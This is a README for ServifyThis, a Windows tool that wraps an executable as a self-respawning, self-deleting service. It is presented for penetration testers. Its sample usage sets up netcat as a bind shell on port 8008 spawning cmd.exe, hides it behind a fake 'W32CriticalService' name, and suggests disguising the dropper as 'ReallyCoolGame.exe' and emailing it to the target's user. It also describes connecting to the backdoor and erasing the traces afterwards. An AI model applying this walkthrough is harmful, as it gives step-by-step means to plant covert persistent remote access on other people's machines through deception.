# ServifyThis

Windows machines run services in the background, letting admins manage them via the Services Control panel (services.msc) or the sc command. Penetration testers sometimes want to create a Windows service that will allow them to gain and maintain remote access of a Windows machine, possibly a persistent listener offering up shell access on a given port. Unfortunately, while the Windows sc command can be used to run any .exe as a service, Windows waits 30 seconds for the given program to throw a given API call to indicate that the service has started successfully. If Windows doesn't hear back from the service, it kills the program, thinking that the service failed to start. Thus, with sc, you can make your service, but you'll only get 30 seconds of access.
Previously, various commercial and shareware programs were available that would wrap provided executables inside of code that makes the appropriate calls so that Windows would let the executable run as a service and avoid the 30-second kill rule. But, such programs were only available for a fee... until now.

InGuardians' ServifyThis program takes any Windows executable and converts it into a form suitable for use as a Windows service.

###**ServifyThis Usage Instructions:**

ServifyThis will take any Win32 executable (either command-line or GUI) and wrap it into a new executable/service/installer program that will:

1) Dump the "servified" executable on the target machine at a user-specified location and with a user-specified name.

2) Create, dump, and install a Win32 service executable that will automatically run the "servified" executable both immediately upon installation and whenever Windows boots. This service can be set to automatically respawn the "servified" executable if it exits. The name and location of the service executable, its file path, and the service name (shown in the Service control panel) are all user-specified. Optionally, the GUI of the "servified" executable can be displayed... although I don't know why you might want to...

3) The installation package self-deletes when its payload has been delivered.

4) Running the service executable with a "-u" (uninstall) option, will cause it to stop the service, stop the executable, remove the "servified" executable and finally, self-delete, leaving nothing behind on the previously exploited machine.

The parameters entered into the GUI of ServifyThis should be self-explanatory, but the following example usage should answer any lingering questions.

###**Sample Usage:**

Launch ServifyThis.exe

The parameters are broken into two groups, parameters that apply to the local machine and remote parameters that apply to the machine where the "servified" executable will be installed.

Locally, we want to choose our copy of the netcat executable:

Application to "servify": c:\program files\attack tools\nc.exe

Remotely, we want to set netcat up to work like this:

`Application Pathname: c:\windows\win32svc.exe
Command Parameters: -l -p 8008 -e c:\windows\system32\cmd.exe
Working Directory: c:\
Service Display Name: W32CriticalService
Service Pathname: c:\windows\system32\w32critsvc.exe`

Additionally, we need to make sure that the "Respawn" checkbox is checked, as it is by default. Finally, let's set our respawn interval to 1 sec.

Once we click on the "OK" button, ServifyThis spits out a new executable called "Servified.exe" in the current directory.

We then arrange for "Servified.exe" to be run on our target machine, say, by changing the name to something like "ReallyCoolGame.exe" and emailing it to the machine's user, for instance.

When Servified.exe is run on the target machine, it'll drop a copy of nc.exe into the c:\windows directory under the name win32svc.exe. It will create and drop a new service (c:\windows\system32\w32critsvc.exe) which it will install and launch. The sole purpose of this service is to launch the copy of nc.exe (now called c:\windows\win32svc.exe) with the parameters specified (which will cause it to listen on port 8008 and spawn a command shell back to anyone who connects to that port).

With that work done, Servified.exe will simply disappear, deleting itself.

We then use a local copy of netcat to connect up to our target:

`c:\Program Files\Attack Tools>nc  8008`
  
This will return us a command shell anchored in the c:\ directory, as that's what we specified for nc.exe's working directory.

We can do anything we want to do with that backdoor, confident in the knowledge that it will both continuously respawn while the machine is running, and will autostart if the machine is rebooted.

Finally, once we've done our dirty work on the target machine, we can simply change to the c:\windows\system32 directory and issue the command:

`c:\>w32critsvc -u`
  
which will stop the running service, stop the running instance of nc, and delete both the c:\windows\win32svc.exe file and the c:\windows\system32\w32critsvc.exe file.
